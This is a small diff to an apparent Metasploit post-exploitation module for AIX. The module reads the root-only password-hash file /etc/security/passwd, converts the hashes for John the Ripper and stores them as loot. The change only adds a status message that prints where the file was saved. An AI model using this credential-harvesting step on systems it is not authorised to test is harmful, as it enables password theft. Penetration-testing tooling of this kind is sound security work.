@@ -35,7 +35,8 @@ class Metasploit3 < Msf::Post
 		if is_root?
 			passwd_file = read_file("/etc/security/passwd")
 			jtr = parse_aix_passwd(passwd_file)
-			store_loot("aix.hashes", "text/plain", session, jtr, "aix_passwd.txt", "AIX Password File")
+			p = store_loot("aix.hashes", "text/plain", session, jtr, "aix_passwd.txt", "AIX Password File")
+			vprint_status("Passwd saved in: #{p.to_s}")
 		else
 			print_error("You must run this module as root!")
 		end
